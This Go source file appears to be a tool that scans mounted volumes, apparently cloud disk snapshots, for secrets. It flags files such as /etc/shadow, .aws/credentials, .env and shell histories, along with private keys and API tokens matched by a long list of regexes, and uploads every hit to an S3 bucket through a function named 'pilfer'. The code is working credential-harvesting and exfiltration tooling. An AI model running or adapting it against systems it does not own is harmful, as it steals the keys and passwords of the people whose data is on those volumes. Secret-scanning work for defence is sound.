package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3/s3manager"
	"github.com/deckarep/golang-set"
	"lukechampine.com/blake3"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
	"sync"
)

// concurrent access on mapset okay
var blacklist_exact mapset.Set
var blacklist_contains []string
var blacklist_prefix []string

func setupBlacklists() {
	blacklist_exact = mapset.NewSetFromSlice([]interface{}{})
	for _, line := range DefaultBlacklist {
		blacklist_exact.Add(line)
	}

	blacklist_contains = []string{
		// os
		"/.local/",
		// java
		"etc/java-8-openjdk/",
		"etc/java-10-openjdk/",
		"etc/java-11-openjdk/",
		"usr/lib/jvm/",
		//ruby
		"vendor/gems/",
		"/.gem/",
		// python
		"/__pycache__/",
		"/site-packages/",
		"/vendor/jupyter/",
		"vendor/bundle/ruby/",
		// rust
		"/.rustup/",
		"/.cache/",
		"/.cargo/",
		"./Program Files/dotnet/",
		// user progs
		"/.fzf/",
		"/.vim/",
		"/.bundle/",
		"/.mozilla/",
		"/etc/brltty/",
		"/etc/fonts/conf.avail/",
		"/Windows/servicing",
		"/Windows/System32",
		"/Windows/SysWOW64",
		"/root/boot/",
		"/root/cdrom/",
		"/root/dev/",
		"/root/lib/",
		"/root/lib64/",
		"/root/lost+found/",
		"/root/run/",
		"/root/proc/",
		"/root/sys/",
		"/root/snap/core/",
		"/root/usr/src/",
		"/root/usr/include/",
		"/root/var/lib/lxcfs",
		"/root/var/lib/yum",
		"/root/var/lib/dpkg",
		"/root/var/cache/",
		"/root/usr/share/",
		"/root/usr/lib/",
		"/root/usr/libexec/",
		"/root/usr/lib64/",
		"/root/etc/selinux/",
		"/root/etc/ld.so.conf.d/",
		"/root/Program Files/dotnet/",
		"/root/Program Files (x86)/AWS SDK for .NET/",
		"/root/var/lib/apt/lists",
		"/root/coreos/grub/",
		"/root/EFI/",
		"/root/Boot/",
		"/root/Program Files/Amazon/",
		"/root/Program Files/Common Files/",
		"/root/Program Files/IIS/Microsoft Web Deploy",
		"/root/Program Files/Internet Explorer/",
		"/root/Program Files/Reference Assemblies/",
		"/root/Program Files/MSBuild/",
		"/root/Program Files/Windows Defender/",
		"/root/Program Files/WindowsPowerShell/",
		"/root/Windows/",
		"/boot/",
		"/cdrom/",
		"/dev/",
		"/lib/",
		"/lib64/",
		"/lost+found/",
		"/run/",
		"/proc/",
		"/sys/",
		"/snap/core/",
		"/usr/src/",
		"/usr/include/",
		"/var/lib/lxcfs",
		"/var/lib/yum",
		"/var/lib/dpkg",
		"/var/cache/",
		"/usr/share/",
		"/usr/lib/",
		"/usr/libexec/",
		"/usr/lib64/",
		"/etc/selinux/",
		"/etc/ld.so.conf.d/",
		"/Program Files/dotnet/",
		"/Program Files (x86)/AWS SDK for .NET/",
		"/var/lib/apt/lists",
		"/coreos/grub/",
		"/EFI/",
		"/Boot/",
		"/Program Files/Amazon/",
		"/Program Files/Common Files/",
		"/Program Files/IIS/Microsoft Web Deploy",
		"/Program Files/Internet Explorer/",
		"/Program Files/Reference Assemblies/",
		"/Program Files/MSBuild/",
		"/Program Files/Windows Defender/",
		"/Program Files/WindowsPowerShell/",
		"/Windows/",
		"/ProgramData/Windows/",
	}

	blacklist_prefix = []string{
		"/boot/",
		"/cdrom/",
		"/dev/",
		"/lib/",
		"/lib64/",
		"/lost+found/",
		"/run/",
		"/proc/",
		"/sys/",
		"/snap/core/",
		"/usr/src/",
		"/usr/include/",
		"/var/lib/lxcfs",
		"/var/lib/yum",
		"/var/lib/dpkg",
		"/var/cache/",
		"/usr/share/",
		"/usr/lib/",
		"/usr/libexec/",
		"/usr/lib64/",
		"/etc/selinux/",
		"/etc/ld.so.conf.d/",
		"/Program Files/dotnet/",
		"/Program Files (x86)/AWS SDK for .NET/",
		"/var/lib/apt/lists",
		"/coreos/grub/",
		"/EFI/",
		"/Boot/",
		"/Program Files/Amazon/",
		"/Program Files/Common Files/",
		"/Program Files/IIS/Microsoft Web Deploy",
		"/Program Files/Internet Explorer/",
		"/Program Files/Reference Assemblies/",
		"/Program Files/MSBuild/",
		"/Program Files/Windows Defender/",
		"/Program Files/WindowsPowerShell/",
		"/Windows/",
		"/var/www/dash-frontend/node_modules",
		"/var/www/dash-rest/node_modules",
		"/var/log/kern.log",
		"/usr/portage/",
		"/data/github/",
	}
}

func checkContentsRegex(b []byte) []string {
	//regex defs
	re_ssh_private := regexp.MustCompile(`-----(BEGIN|END)[\s](DSA|RSA|EC|OPENSSH)[\s]PRIVATE[\s]KEY-----`)
	re_aws_mws := regexp.MustCompile(`amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}`)
	re_aws_access_key := regexp.MustCompile(`(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}`)
	re_aws_secret_key := regexp.MustCompile(`("|')?(AWS|aws|Aws)?_?(SECRET|secret|Secret)?_?(ACCESS|access|Access)?_?(KEY|key|Key)("|')?\s*(:|=>|=)\s*("|')?[A-Za-z0-9/\+=]{40}("|')?`)
	re_aws_account_key := regexp.MustCompile(`("|')?(AWS|aws|Aws)?_?(ACCOUNT|account|Account)_?(ID|id|Id)?("|')?\s*(:|=>|=)\s*("|')?[0-9]{4}\-?[0-9]{4}\-?[0-9]{4}("|')?`)
	re_generic_secret := regexp.MustCompile(`(-----(BEGIN|END)[\s]PRIVATE[\s]KEY-----)|([s|S][e|E][c|C][r|R][e|E][t|T].*('|")[0-9a-zA-Z]{32,45}('|"))|([a|A][p|P][i|I][_]?[k|K][e|E][y|Y].*('|")[0-9a-zA-Z]{32,45}('|"))|([a-zA-Z]{3,10}://[^/\s:@]{3,20}:[^/\s:@]{3,20}@.{1,100}("|'|\s))|(('|")[0-9a-zA-Z]{32,64}('|"))|([0-9a-z]{32,64})`)
	re_api_key := regexp.MustCompile(`(?i)[a-z]+[_-]?api[_-]?key[\s]*=[\s]*["'a-z0-9]`)

	var regex_results = make([]string, 0)

	//TODO - lots of duplication here, some kind of iterator needed!
	if re_ssh_private.Find(b) != nil {
		// this file has a hit!, make sure we record this!
		regex_results = append(regex_results, "re_ssh_private")
	}
	if re_aws_mws.Find(b) != nil {
		// this file has a hit!, make sure we record this!
		regex_results = append(regex_results, "re_aws_mws")
	}
	if re_aws_access_key.Find(b) != nil {
		// this file has a hit!, make sure we record this!
		regex_results = append(regex_results, "re_aws_access_key")
	}
	if re_aws_secret_key.Find(b) != nil {
		// this file has a hit!, make sure we record this!
		regex_results = append(regex_results, "re_aws_secret_key")
	}
	if re_aws_account_key.Find(b) != nil {
		// this file has a hit!, make sure we record this!
		regex_results = append(regex_results, "re_aws_account_key")
	}
	if re_generic_secret.Find(b) != nil {
		// this file has a hit!, make sure we record this!
		regex_results = append(regex_results, "re_generic_secret")
	}
	if re_api_key.Find(b) != nil {
		// this file has a hit!, make sure we record this!
		regex_results = append(regex_results, "re_api_key")
	}
	/*
	(-----(BEGIN|END)[\s]PRIVATE[\s]KEY-----)|([s|S][e|E][c|C][r|R][e|E][t|T].*('|")[0-9a-zA-Z]{32,45}('|"))|([a|A][p|P][i|I][_]?[k|K][e|E][y|Y].*('|")[0-9a-zA-Z]{32,45}('|"))|([a-zA-Z]{3,10}://[^/\s:@]{3,20}:[^/\s:@]{3,20}@.{1,100}("|'|\s))|(('|")[0-9a-zA-Z]{32,64}('|"))|([0-9a-z]{32,64})



	    # Keep this file alphabetically sorted by Providers
	#
	# Resources:
	#    https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json
	#    https://blog.acolyer.org/2019/04/08/how-bad-can-it-git-characterizing-secret-leakage-in-public-github-repositories/

	# Amazon
	    amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}
	    AKIA[0-9A-Z]{16}
	# DSA/RSA/EC/OPENSSH Private key
	    -----(BEGIN|END)[\s](DSA|RSA|EC|OPENSSH)[\s]PRIVATE[\s]KEY-----
	# Facebook
	    EAACEdEose0cBA[0-9A-Za-z]+
	    [f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].*('|")[0-9a-f]{32}('|")
	# Generic
	    -----(BEGIN|END)[\s]PRIVATE[\s]KEY-----
	    [s|S][e|E][c|C][r|R][e|E][t|T].*('|")[0-9a-zA-Z]{32,45}('|")
	    [a|A][p|P][i|I][_]?[k|K][e|E][y|Y].*('|")[0-9a-zA-Z]{32,45}('|")
	    [a-zA-Z]{3,10}://[^/\s:@]{3,20}:[^/\s:@]{3,20}@.{1,100}("|'|\s)
	    ('|")[0-9a-zA-Z]{32,64}('|")
	    [0-9a-z]{32,64}
	# Google
	    AIza[0-9A-Za-z\-_]{35}
	    [0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com
	    4/[0-9A-Za-z\-_]+
	    1/[0-9A-Za-z\-_]{43}
	    1/[0-9A-Za-z\-_]{64}
	    ya29\.[0-9A-Za-z\-_]+
	    AIza[0-9A-Za-z\-_]{35}
	    ('|")client_secret('|"):('|")[a-zA-Z0-9_]{24}('|")
	    ('|")type('|"):[\s]('|")service_account('|")
	# Github
	    [g|G][i|I][t|T][h|H][u|U][b|B].*('|")[0-9a-zA-Z]{35,40}('|")
	# Heroku
	    [h|H][e|E][r|R][o|O][k|K][u|U].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}
	# MailChimp
	    [0-9a-f]{32}-us[0-9]{1,2}
	# Mailgun
	    key-[0-9a-zA-Z]{32}
	# Modular Crypt Format
	    \$[a-z0-9-]+\$[0-9A-Za-z./+=,$-]+
	# PGP Private key
	    -----(BEGIN|END)[\s]PGP[\s]PRIVATE[\s]KEY[\s]BLOCK-----
	# PayPal
	    access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}
	# Picatic
	    sk_live_[0-9a-z]{32}
	# Slack
	    (xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32})
	    https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}
	# Square
	    sq0atp-[0-9A-Za-z\-_]{22}
	    sq0csp-[0-9A-Za-z\-_]{43}
	# Stripe
	    sk_live_[0-9a-zA-Z]{24}
	    rk_live_[0-9a-zA-Z]{24}
	# Twilio
	    SK[0-9a-fA-F]{32}
	# Twitter
	    [1-9][0-9]+-[0-9a-zA-Z]{40}
	    [t|T][w|W][i|I][t|T][t|T][e|E][r|R].*('|")[0-9a-zA-Z]{35,44}('|")
	# vim:ft=text
	*/

	return regex_results
}

func IsSensitiveFileName(path string) bool {
	re_sensitive_file := regexp.MustCompile(`(/etc/shadow|/etc/hosts|\.[a-zA-Z_-]+history$|\.docker/config\.json|\.aws/credentials|\.aws/config|\.env$|\.git/config$|web\.config)`)

	if re_sensitive_file.Find([]byte(path)) != nil {
		// this file has a hit!, make sure we record this!
		fmt.Printf("[+] found sensitive file %s", path)
		return true
	}
	return false
}

func UploadFileToS3(filename string, hash string, bucketname string, volumeid string) {
	// Open the file
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Failed to open file", filename, err)
		return
	}
	defer file.Close()

	for i := 0; i < 10; i++ {
		conf := aws.Config{Region: aws.String(aws_region)}
		sess := session.New(&conf)
		svc := s3manager.NewUploader(sess)
		_, err = svc.Upload(&s3manager.UploadInput{
			Bucket: aws.String(bucketname),
			Key:    aws.String(filepath.Base(filename) + "_" + hash + "_" + volumeid),
			Body:   file,
		})
		if err == nil {
			break
		} else {
			fmt.Printf("Error uploading to S3: %s. Retrying upload...\n", err)
			time.Sleep(1 * time.Second)
		}
	}

	fmt.Printf("Success! Uploaded file %s to bucket %s\n", filename, bucketname)
}

func isTextFile(filename string) bool {
	file, err := os.Open(filename)
	if err != nil {
		return false
	}
	defer file.Close()

	buffer := make([]byte, 512)
	_, read_err := file.Read(buffer)
	if read_err != nil {
		return false
	}

	contentType := http.DetectContentType(buffer)
	return strings.HasPrefix(contentType, "text/")
}

// Scans a given file for secrets
func pilfer(limiter chan bool, waitgroup *sync.WaitGroup, mount_point string, path string, bucketname string, volumeid string) {
	// When we're done with this goroutine, remove ourselves to the waitgroup
	defer waitgroup.Done()
	defer func() {<- limiter}()

	orig_path := path
	// Remove the mount point on it, so we can look at the file path as if it were on /
	filepath := strings.TrimPrefix(path, mount_point)

	// Check the path to see if it's something we don't want
	if blacklist_exact.Contains(filepath) {
		return
	}
	for _, item := range blacklist_contains {
		if strings.Contains(filepath, item) {
			return
		}
	}
	for _, item := range blacklist_prefix {
		if strings.HasPrefix(filepath, item) {
			return
		}
	}

	file, err := os.Open(orig_path)
	if err != nil {
		_, error := os.Stat(orig_path)
		if error != nil {
			return
		}
		return
	}
	defer file.Close()

	// blake3 the file
	hash := blake3.New(16, nil)
	if _, err := io.Copy(hash, file); err != nil {
		fmt.Printf("ERROR: Couldn't read file %s. Error: %s\n", orig_path, err)
		return
	}

	hash_s := hex.EncodeToString(hash.Sum(nil))

	// Ignore non-text files
	if !isTextFile(orig_path) {
		return
	}

	// Check the filename
	if IsSensitiveFileName(filepath) {
		fmt.Printf("[+] found sensitive filename %s, hash %s\n", filepath, hash_s)
		UploadFileToS3(orig_path, hash_s, bucketname, volumeid)
		return
	}

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		regex_results := checkContentsRegex([]byte(scanner.Text()))
		if len(regex_results) > 0 {
			// we have a regex match, let's store the file
			fmt.Printf("[+] found secret in file %s, hash %s\n", filepath, hash_s)
			UploadFileToS3(orig_path, hash_s, bucketname, volumeid)
			return
		}
	}
	return
}
